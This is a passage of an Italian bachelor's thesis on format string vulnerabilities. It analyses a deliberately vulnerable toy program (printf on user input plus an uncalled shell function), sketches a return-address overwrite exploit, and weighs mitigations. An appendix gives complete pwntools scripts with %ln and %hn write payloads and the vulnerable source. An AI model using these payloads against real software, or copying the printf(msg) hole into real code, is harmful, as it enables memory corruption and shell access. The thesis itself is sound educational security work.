\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Estratto dell'output del comando \texttt{file} sul binario},
    label={lst:file_output}
]
    ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, [...], not stripped
\end{lstlisting}

Tipicamente i binari vengono compilati con l'opzione \texttt{-s} (\emph{strip}) che rimuove tutte le tabelle dei simboli e le informazioni di debug dal file eseguibile finale: oltre a ridurne le dimensioni, questo lo protegge rendendolo poco comprensibile. Per semplicità però, il binario in questo capitolo è stato compilato senza tale opzione. Vediamo infatti ``\texttt{not stripped}'' (Codice~\ref{lst:file_output}).

Un'altra informazione essenziale sono le impostazioni di sicurezza del binario che vengono ricavate dal comando \texttt{pwn checksec} (Codice~\ref{lst:checksec_output}).
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Output del comando \texttt{pwn checksec} sul binario},
    label={lst:checksec_output}
]
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
\end{lstlisting}
Tale configurazione è il default del compilatore GCC nel nostro ambiente (Tabella~\ref{tab:ambiente_riferimento}).

I comandi \texttt{file} e \texttt{pwn checksec} danno una prima idea del binario --- il tipo di disassemblato che si otterrà, le convenzioni in uso, le protezioni da affrontare --- ma nulla sulla logica del codice: per quella servono il disassemblato e il decompilato, entrambi ottenibili con \texttt{Ghidra}.

Il codice decompilato è un tentativo di ricostruire la logica e la struttura del programma originale esaminando il codice assembly (il disassemblato). Tale ricostruzione però è spesso confusionaria e va sistemata per rendere il codice più comprensibile (Codice~\ref{lst:ghidra_decompiled}).
\begin{lstlisting}[
    language=C,
    numbers=none,
    gobble=4,
    caption={Estratto del decompilato di \texttt{Ghidra} sistemato},
    label={lst:ghidra_decompiled}
]
    void debug_shell(void) {
        system("/bin/sh");
        return;
    }

    void log_message(char *msg) {
        printf(msg);
        return;
    }

    int main(void) {
        char buf[64];

        // ...
        puts("=== MiniLog v1.0 ===");
        while (fgets(buf, 64, stdin) != NULL) {
            log_message(buf);
        }
        // ...
        return 0;
    }
\end{lstlisting}
Il programma è una sorta di MiniLog che va a stampare in \texttt{stdout} tutto quello che viene scritto su \texttt{stdin}. Il problema sono le due funzioni \texttt{log\_message} e \texttt{debug\_shell}.

All'interno di \texttt{log\_message} è presente \texttt{printf(msg)} con \texttt{msg} controllata dall'utente e quindi vulnerabile.

La funzione \texttt{debug\_shell} apre una shell e, di per sé, non sarebbe un problema, poiché non viene mai chiamata da nessun punto del programma. In questo caso però, è pericolosa per la presenza della vulnerabilità format string che può dirottare il normale flusso d'esecuzione.

L'idea è di sfruttare la vulnerabilità format string andando a sovrascrivere il \emph{return address} (indirizzo di ritorno) di \texttt{log\_message} con l'indirizzo di \texttt{debug\_shell}: quando \texttt{log\_message} termina, l'esecuzione riprende da lì anziché da \texttt{main}, aprendo così una shell.
Per far ciò, è necessario conoscere sia l'indirizzo della funzione \texttt{debug\_shell} sia l'indirizzo dello stack dove è salvato il return address di \texttt{log\_message}.

Questi indirizzi però vengono randomizzati a causa di PIE (Codice~\ref{lst:checksec_output}) e ASLR, quest'ultima attiva di default a livello di sistema operativo, che complicano ma non rendono impossibile lo sfruttamento, soprattutto grazie alla presenza del ciclo \texttt{while}, che ci permette di iterare più volte sulla \texttt{printf} vulnerabile.

È infatti possibile calcolare l'indirizzo di \texttt{debug\_shell} a partire dal leak di un indirizzo dell'eseguibile, e calcolare l'indirizzo dove è salvato il return address di \texttt{log\_message} a partire dal leak di un indirizzo dello stack. In una successiva iterazione è poi possibile sovrascrivere tale return address con l'indirizzo di \texttt{debug\_shell} appena calcolato.


\section{Fase di leak: individuazione degli indirizzi utili}\label{sec:leak_phase}


\chapter{Mitigazioni}\label{chapter:mitigations}
Le protezioni dedicate alla vulnerabilità format string intervengono su due livelli distinti e complementari: uno a runtime (interno alla libreria del linguaggio C) e uno sul codice sorgente. Il primo non dipende dalla correttezza del codice sorgente e agisce anche quando il pattern vulnerabile è ancora presente; il secondo punta invece a prevenire tale pattern nel sorgente che produce il binario.

%
%
%%%% Le Conclusioni
\pagestyle{plain}
\chapter*{Conclusioni} %Se si cambia il Titolo cambiare anche la riga successiva così che appaia corretto nell'indice
\addcontentsline{toc}{chapter}{Conclusioni} %Per far apparire Conclusioni nell'indice (Il nome deve rispecchiare quello del chapter)

Nessuna delle protezioni di sicurezza attive di default sul binario (Codice~\ref{lst:checksec_output}, Tabella~\ref{tab:ambiente_riferimento}) impedisce di causare leak di informazioni e di eseguire scritture in memoria. Delle due protezioni pensate specificamente per questa vulnerabilità (Capitolo~\ref{chapter:mitigations}), quella a runtime (Sezione~\ref{sec:fortify_source}) blocca la scrittura arbitraria ma lascia comunque ottenibile il leak di informazioni, anche se con un payload più lungo e meno mirato; solo quella sul codice sorgente (Sezione~\ref{sec:prevention}), abbinata a \texttt{-Werror}, impedisce che il pattern vulnerabile venga anche solo compilato. Ne emerge una gerarchia netta: le protezioni generiche sono inefficaci contro questa vulnerabilità, quelle dedicate a runtime ne riducono il danno senza eliminarla e solo l'intervento sul codice sorgente la previene alla radice.

Questo risultato non è solo argomentato ma dimostrato: la Sezione~\ref{sec:fortify_verify} riprende lo stesso exploit del Capitolo~\ref{chapter:exploit} contro lo stesso programma ricompilato con la protezione attiva. È questa continuità a rendere il risultato più solido di una trattazione puramente teorica.

Il lavoro resta circoscritto all'ambiente di riferimento (Tabella~\ref{tab:ambiente_riferimento}): un'estensione naturale sarebbe verificare se lo stesso meccanismo vale su un'altra architettura. Un esempio è AArch64, la cui calling convention riserva otto registri general-purpose agli argomenti anziché sei, con una register save area equivalente definita esplicitamente per le funzioni variadiche~\cite{aapcs64}: il numero di argomenti fantasma prima di esaurire i registri diventerebbe sette anziché cinque, ma il meccanismo della Sottosezione~\ref{subsec:funvar_cc} resterebbe identico.

%
%%%% La nota sull'utilizzo di IA
\chapter*{Utilizzo di strumenti di IA}
\addcontentsline{toc}{chapter}{Utilizzo di strumenti di IA}
Per la stesura di questa tesi ho utilizzato lo strumento di intelligenza artificiale Claude Sonnet 5 (Anthropic), tra la fine di luglio e i primi di settembre 2026, per brainstorming, creazione del codice dei diagrammi e correzioni stilistiche e grammaticali. Ogni contenuto è stato verificato e validato personalmente, tramite compilazione, esecuzione o fonti primarie a seconda dei casi, prima dell'inclusione nell'elaborato.

%
%%%% La bibliografia
\bibliographystyle{plainit}
\cleardoublepage
\addcontentsline{toc}{chapter}{\bibname}
\bibliography{./Bibliografia}
%
\chapter*{Ringraziamenti}
Ringrazio il mio relatore, il professor Roberto Alfieri, per avermi seguito con disponibilità durante tutta la stesura della tesi e per avermi fatto scoprire, tramite CyberChallenge.IT, il mondo della sicurezza informatica, a cui mi sono poi appassionato.

Ringrazio la mia famiglia per aver creduto in me, per avermi sempre sostenuto durante questo percorso, sia emotivamente che finanziariamente e per la libertà che mi ha sempre concesso senza applicare nessun tipo di pressione.

Ringrazio amici e parenti che mi hanno fatto compagnia nei momenti più difficili e che hanno reso questo periodo più sereno e leggero.

Ringrazio infine me stesso per l'impegno e la dedizione applicati durante questi tre anni.

%
% Le appendici
\appendix
\chapter{Codice sorgente}\label{app:source}
In questa appendice sono raccolte, nella loro forma completa ed eseguibile, le parti di codice che nel corpo del testo sono state mostrate solo tramite estratti o, nel caso del programma discusso nel Capitolo~\ref{chapter:exploit}, tramite il solo codice decompilato. Non introducono alcuna tecnica nuova rispetto a quanto già spiegato: assemblano soltanto per intero ciò che nelle sezioni indicate in ciascuna didascalia è stato costruito un pezzo alla volta. 


\section{Script del Capitolo~\ref{chapter:fmt_vuln}}\label{sec:app_cap2}
Il Codice~\ref{lst:app_write_script} riporta la versione completa dello script per la scrittura di \texttt{global\_secret} tramite \texttt{\%ln}, il cui frammento essenziale --- la costruzione del payload --- è già mostrato nel Codice~\ref{lst:python_write} (Sezione~\ref{sec:mem_write}).
\begin{lstlisting}[
    language=Python,
    gobble=4,
    caption={Script completo per la scrittura di \texttt{global\_secret} con \texttt{\%ln} (Sezione~\ref{sec:mem_write})},
    label={lst:app_write_script}
]
    from pwn import *

    exe = ELF('./write_demo')
    context.binary = exe
    io = exe.process()

    payload = b'%4919x' \
                + b'%8$ln' \
                + b'\x00' * 5 \
                + p64(0x404050)
    io.sendline(payload)

    io.interactive()
\end{lstlisting}

Il Codice~\ref{lst:app_partial_write_script} riporta la versione completa dello script per la scrittura parziale di \texttt{global\_secret} tramite \texttt{\%hn}, il cui frammento essenziale è già mostrato nel Codice~\ref{lst:python_partial_write} (Sezione~\ref{sec:partial_write}).
\begin{lstlisting}[
    language=Python,
    gobble=4,
    caption={Script completo per la scrittura parziale di \texttt{global\_secret} con \texttt{\%hn} (Sezione~\ref{sec:partial_write})},
    label={lst:app_partial_write_script}
]
    from pwn import *

    exe = ELF('./write_demo')
    context.binary = exe
    io = exe.process()

    payload = b'%48879x' + b'%10$hn' \
                + b'%8126x' + b'%11$hn' \
                + b'\x00' * 7 \
                + p64(0x404050) \
                + p64(0x404050 + 2)            
    io.sendline(payload)

    io.interactive()
\end{lstlisting}


\section{Sorgente del Capitolo~\ref{chapter:exploit}}\label{sec:app_cap3}
Il Codice~\ref{lst:app_vuln_source} riporta il sorgente completo del programma analizzato nel Capitolo~\ref{chapter:exploit}, in cui è mostrato solo il decompilato sistemato con Ghidra (Codice~\ref{lst:ghidra_decompiled}). È incluso qui per riproducibilità: nello scenario black-box del capitolo il sorgente non è mai a disposizione dell'attaccante, che dispone solo del binario.
\begin{lstlisting}[
    language=C,
    gobble=4,
    caption={Sorgente completo del programma analizzato nel Capitolo~\ref{chapter:exploit}},
    label={lst:app_vuln_source}
]
    #include <stdio.h>
    #include <stdlib.h>

    void debug_shell(void) {
        system("/bin/sh");
    }

    void log_message(char *msg) {
        printf(msg);
    }

    int main(void) {
        char buf[64];

        puts("=== MiniLog v1.0 ===");

        while (fgets(buf, sizeof(buf), stdin) != NULL) {
            log_message(buf);
        }
        
        return 0;
    }
\end{lstlisting}

%
\end{document}